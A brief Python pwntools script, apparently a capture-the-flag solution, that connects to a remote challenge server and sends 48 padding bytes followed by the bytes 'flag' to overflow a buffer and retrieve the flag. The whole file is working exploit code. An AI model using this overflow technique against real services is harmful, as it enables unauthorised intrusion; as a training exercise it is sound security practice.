from pwn import *

r = remote('thekidofarcrania.com', 35235)
x = r.recvuntil('some text:').decode()
print(x)
r.send(b'a' * 48 + bytes.fromhex('666c6167') + b'\n')
x = r.recvall().decode()
print(x)
